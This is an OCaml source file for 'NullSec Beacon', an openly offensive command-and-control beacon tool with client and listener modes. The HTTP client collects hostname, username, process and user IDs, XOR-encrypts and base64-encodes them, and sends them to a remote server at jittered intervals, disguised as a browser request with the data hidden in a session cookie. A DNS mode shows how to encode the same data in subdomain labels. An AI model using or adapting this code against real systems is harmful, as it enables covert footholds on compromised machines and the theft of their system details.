(* NullSec Beacon - Lightweight Network Beacon & Callback System
   Language: OCaml
   Author: bad-antics
   License: NullSec Proprietary *)

open Unix
open Printf

let version = "1.0.0"

let banner = {|
    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █░░░░░░░░░░░░░░░░░ B E A C O N ░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                       bad-antics v|} ^ version

(* Configuration type *)
type config = {
  mode: string;
  server: string;
  port: int;
  interval: int;
  jitter: int;
  domain: string;
  ssl: bool;
  key: string;
  verbose: bool;
}

let default_config = {
  mode = "";
  server = "127.0.0.1";
  port = 8443;
  interval = 30;
  jitter = 20;
  domain = "";
  ssl = false;
  key = "nullsec";
  verbose = false;
}

(* Utility functions *)
let random_jitter interval jitter_percent =
  let jitter_amount = (interval * jitter_percent) / 100 in
  let variance = Random.int (2 * jitter_amount + 1) - jitter_amount in
  max 1 (interval + variance)

let get_hostname () =
  try gethostname () with _ -> "unknown"

let get_username () =
  try (getpwuid (getuid ())).pw_name with _ -> "unknown"

let get_timestamp () =
  let tm = localtime (time ()) in
  sprintf "%04d-%02d-%02d %02d:%02d:%02d"
    (tm.tm_year + 1900) (tm.tm_mon + 1) tm.tm_mday
    tm.tm_hour tm.tm_min tm.tm_sec

let log_msg verbose msg =
  if verbose then
    printf "[%s] %s\n%!" (get_timestamp ()) msg

(* Simple XOR encryption *)
let xor_encrypt key data =
  let key_len = String.length key in
  String.mapi (fun i c ->
    Char.chr ((Char.code c) lxor (Char.code (String.get key (i mod key_len))))
  ) data

let base64_encode str =
  let tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" in
  let len = String.length str in
  let buf = Buffer.create (((len + 2) / 3) * 4) in
  let rec encode i =
    if i >= len then ()
    else begin
      let b0 = Char.code (String.get str i) in
      let b1 = if i + 1 < len then Char.code (String.get str (i + 1)) else 0 in
      let b2 = if i + 2 < len then Char.code (String.get str (i + 2)) else 0 in
      Buffer.add_char buf (String.get tbl (b0 lsr 2));
      Buffer.add_char buf (String.get tbl (((b0 land 0x03) lsl 4) lor (b1 lsr 4)));
      if i + 1 < len then
        Buffer.add_char buf (String.get tbl (((b1 land 0x0F) lsl 2) lor (b2 lsr 6)))
      else
        Buffer.add_char buf '=';
      if i + 2 < len then
        Buffer.add_char buf (String.get tbl (b2 land 0x3F))
      else
        Buffer.add_char buf '=';
      encode (i + 3)
    end
  in
  encode 0;
  Buffer.contents buf

(* System info gathering *)
let get_system_info () =
  let hostname = get_hostname () in
  let username = get_username () in
  let pid = getpid () in
  let uid = getuid () in
  sprintf "host=%s;user=%s;pid=%d;uid=%d;time=%s"
    hostname username pid uid (get_timestamp ())

(* HTTP beacon client *)
let http_beacon config =
  log_msg config.verbose "Starting HTTP beacon client";
  log_msg config.verbose (sprintf "Target: %s:%d" config.server config.port);
  log_msg config.verbose (sprintf "Interval: %ds (jitter: %d%%)" config.interval config.jitter);
  
  let beacon_id = sprintf "%s_%s_%d" (get_hostname ()) (get_username ()) (getpid ()) in
  
  let rec beacon_loop () =
    let sleep_time = random_jitter config.interval config.jitter in
    
    try
      (* Create socket and connect *)
      let sock = socket PF_INET SOCK_STREAM 0 in
      let server_addr = ADDR_INET (inet_addr_of_string config.server, config.port) in
      
      connect sock server_addr;
      
      (* Build beacon payload *)
      let sys_info = get_system_info () in
      let encrypted = xor_encrypt config.key sys_info in
      let encoded = base64_encode encrypted in
      
      (* Send HTTP request with beacon data *)
      let request = sprintf 
        "GET /api/v1/check?id=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nCookie: session=%s\r\nConnection: close\r\n\r\n"
        beacon_id config.server encoded in
      
      let _ = write_substring sock request 0 (String.length request) in
      
      (* Read response *)
      let buffer = Bytes.create 4096 in
      let n = read sock buffer 0 4096 in
      let response = Bytes.sub_string buffer 0 n in
      
      close sock;
      
      log_msg config.verbose (sprintf "Beacon sent, response: %d bytes" n);
      
      (* Parse response for commands (simplified) *)
      if String.length response > 0 && config.verbose then
        log_msg config.verbose (sprintf "Server response received")
        
    with
    | Unix_error (err, _, _) ->
      log_msg config.verbose (sprintf "Connection error: %s" (error_message err))
    | e ->
      log_msg config.verbose (sprintf "Error: %s" (Printexc.to_string e));
    
    (* Sleep with jitter *)
    Unix.sleep sleep_time;
    beacon_loop ()
  in
  
  print_endline "[*] Beacon client started. Press Ctrl+C to stop.";
  beacon_loop ()

(* HTTP beacon server *)
let http_server config =
  log_msg config.verbose "Starting HTTP beacon server";
  log_msg config.verbose (sprintf "Listening on port %d" config.port);
  
  let beacons = Hashtbl.create 16 in
  
  let sock = socket PF_INET SOCK_STREAM 0 in
  setsockopt sock SO_REUSEADDR true;
  bind sock (ADDR_INET (inet_addr_any, config.port));
  listen sock 10;
  
  print_endline (sprintf "[*] Server listening on port %d" config.port);
  print_endline "[*] Waiting for beacons...";
  
  let handle_client client_sock client_addr =
    let buffer = Bytes.create 4096 in
    let n = read client_sock buffer 0 4096 in
    let request = Bytes.sub_string buffer 0 n in
    
    (* Extract beacon ID and data from request *)
    let lines = String.split_on_char '\n' request in
    let first_line = List.hd lines in
    
    (* Parse Cookie header for beacon data *)
    let cookie_line = List.find_opt (fun l -> 
      String.length l > 7 && String.sub l 0 7 = "Cookie:"
    ) lines in
    
    let beacon_data = match cookie_line with
      | Some line -> 
        (try
          let parts = String.split_on_char '=' line in
          if List.length parts > 1 then List.nth parts 1
          else ""
        with _ -> "")
      | None -> ""
    in
    
    (* Log beacon *)
    let client_ip = match client_addr with
      | ADDR_INET (addr, _) -> string_of_inet_addr addr
      | _ -> "unknown"
    in
    
    let timestamp = get_timestamp () in
    printf "[%s] Beacon from %s: %s\n%!" timestamp client_ip 
      (if String.length beacon_data > 50 then String.sub beacon_data 0 50 ^ "..." else beacon_data);
    
    Hashtbl.replace beacons client_ip timestamp;
    
    (* Send response *)
    let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK" in
    let _ = write_substring client_sock response 0 (String.length response) in
    
    close client_sock
  in
  
  while true do
    let (client_sock, client_addr) = accept sock in
    handle_client client_sock client_addr
  done

(* DNS beacon - simplified *)
let dns_beacon config =
  log_msg config.verbose "Starting DNS beacon client";
  log_msg config.verbose (sprintf "Domain: %s" config.domain);
  
  print_endline "[*] DNS beaconing requires DNS infrastructure";
  print_endline "[*] Data is encoded in DNS queries to subdomain";
  print_endline "";
  print_endline "Example query format:";
  print_endline (sprintf "  <encoded_data>.%s" config.domain);
  print_endline "";
  
  let sys_info = get_system_info () in
  let encrypted = xor_encrypt config.key sys_info in
  let encoded = base64_encode encrypted in
  
  (* Replace non-DNS-safe chars *)
  let dns_safe = String.map (fun c ->
    match c with
    | '+' -> '-'
    | '/' -> '_'
    | '=' -> '.'
    | _ -> c
  ) encoded in
  
  (* Split into 63-char labels *)
  let rec split_labels s acc =
    if String.length s <= 63 then List.rev (s :: acc)
    else split_labels (String.sub s 63 (String.length s - 63)) (String.sub s 0 63 :: acc)
  in
  
  let labels = split_labels dns_safe [] in
  let query = String.concat "." labels ^ "." ^ config.domain in
  
  printf "[*] DNS query would be: %s\n" query;
  print_endline "[!] Actual DNS resolution not implemented - use dig/nslookup"

(* ICMP beacon - simplified *)
let icmp_beacon config =
  log_msg config.verbose "Starting ICMP beacon client";
  
  print_endline "[*] ICMP beaconing requires raw socket privileges";
  print_endline "[*] Data is encoded in ICMP echo request payload";
  print_endline "";
  print_endline "[!] ICMP raw sockets not implemented in pure OCaml";
  print_endline "[!] Use system ping with payload or external library"

(* Parse command line arguments *)
let parse_args () =
  let config = ref default_config in
  let args = Array.to_list Sys.argv in
  
  let rec parse = function
    | [] -> !config
    | cmd :: rest when cmd = "server" ->
      config := { !config with mode = "server" };
      parse rest
    | cmd :: rest when cmd = "client" ->
      config := { !config with mode = "client" };
      parse rest
    | cmd :: rest when cmd = "dns-client" ->
      config := { !config with mode = "dns" };
      parse rest
    | cmd :: rest when cmd = "icmp-client" ->
      config := { !config with mode = "icmp" };
      parse rest
    | "-s" :: server :: rest | "--server" :: server :: rest ->
      config := { !config with server = server };
      parse rest
    | "-p" :: port :: rest | "--port" :: port :: rest ->
      config := { !config with port = int_of_string port };
      parse rest
    | "-i" :: interval :: rest | "--interval" :: interval :: rest ->
      config := { !config with interval = int_of_string interval };
      parse rest
    | "-j" :: jitter :: rest | "--jitter" :: jitter :: rest ->
      config := { !config with jitter = int_of_string jitter };
      parse rest
    | "-d" :: domain :: rest | "--domain" :: domain :: rest ->
      config := { !config with domain = domain };
      parse rest
    | "-k" :: key :: rest | "--key" :: key :: rest ->
      config := { !config with key = key };
      parse rest
    | "--ssl" :: rest ->
      config := { !config with ssl = true };
      parse rest
    | "-v" :: rest | "--verbose" :: rest ->
      config := { !config with verbose = true };
      parse rest
    | _ :: rest ->
      parse rest
  in
  
  parse (List.tl args)

let print_usage () =
  print_endline {|
USAGE:
    beacon <mode> [options]

MODES:
    server        Run beacon listener/server
    client        Run HTTP beacon client
    dns-client    Run DNS beacon client
    icmp-client   Run ICMP beacon client

OPTIONS:
    -s, --server     Target server address (client mode)
    -p, --port       Port number (default: 8443)
    -i, --interval   Beacon interval in seconds (default: 30)
    -j, --jitter     Jitter percentage (default: 20)
    -d, --domain     Domain for DNS beaconing
    -k, --key        Encryption key (default: nullsec)
    --ssl            Use SSL/TLS (not implemented)
    -v, --verbose    Verbose output

EXAMPLES:
    beacon server -p 8443 -v
    beacon client -s 192.168.1.100 -p 8443 -i 30 -j 20
    beacon dns-client -d beacon.example.com
|}

let () =
  Random.self_init ();
  print_endline banner;
  
  let config = parse_args () in
  
  match config.mode with
  | "server" -> http_server config
  | "client" -> http_beacon config
  | "dns" -> dns_beacon config
  | "icmp" -> icmp_beacon config
  | "" -> print_usage ()
  | mode ->
    printf "[!] Unknown mode: %s\n" mode;
    print_usage ()
